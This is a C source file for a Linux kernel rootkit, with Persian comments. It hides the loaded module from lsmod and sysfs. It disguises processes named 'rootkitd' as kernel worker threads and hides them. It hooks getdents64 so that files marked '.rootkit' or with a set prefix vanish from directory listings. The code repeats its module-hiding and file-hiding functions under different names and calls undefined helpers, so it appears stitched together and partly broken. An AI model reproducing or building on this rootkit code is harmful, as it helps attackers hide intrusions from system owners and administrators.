#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include "common.h"
#include "phantom_defs.h"

// پنهان‌سازی ماژول از lsmod
void hide_module(void) {
    struct list_head *module_list = (struct list_head *)kallsyms_lookup_name("modules");
    struct module *mod = THIS_MODULE;
    
    list_del(&mod->list);
    kobject_del(&mod->mkobj.kobj);
    unlink_module_sysfs(mod);
}

// پنهان‌سازی فرآیندها
void hide_processes(void) {
    struct task_struct *task;
    for_each_process(task) {
        if (strcmp(task->comm, "rootkitd") == 0) {
            task->__state = TASK_DEAD;
            set_task_comm(task, "[kworker/0:0H]");
            hide_task(task);
        }
    }
}

// پنهان‌سازی فایل‌ها
asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret = orig_getdents64(fd, dirp, count);
    struct linux_dirent64 *dir;
    long offset = 0;
    
    while (offset < ret) {
        dir = (struct linux_dirent64 *)((char *)dirp + offset);
        
        // پنهان‌سازی فایل‌های مخفی
        if (strstr(dir->d_name, ".rootkit")) {
            memmove(dir, (char *)dir + dir->d_reclen, ret - offset - dir->d_reclen);
            ret -= dir->d_reclen;
            continue;
        }
        offset += dir->d_reclen;
    }
    return ret;
}

// پنهان‌سازی ماژول از lsmod
void hide_phantom_module(void) {
    struct list_head *module_list = (struct list_head *)kallsyms_lookup_name("modules");
    list_del_init(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

// پنهان‌سازی فایل‌ها در سیستم فایل
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret = orig_getdents64(fd, dirp, count);
    struct linux_dirent64 *dir;
    long offset = 0;

    while (offset < ret) {
        dir = (struct linux_dirent64 *)((char *)dirp + offset);
        
        if (strstr(dir->d_name, PHANTOM_PREFIX)) {
            memmove(dir, (char *)dir + dir->d_reclen, ret - offset - dir->d_reclen);
            ret -= dir->d_reclen;
            continue;
        }
        offset += dir->d_reclen;
    }
    return ret;
}
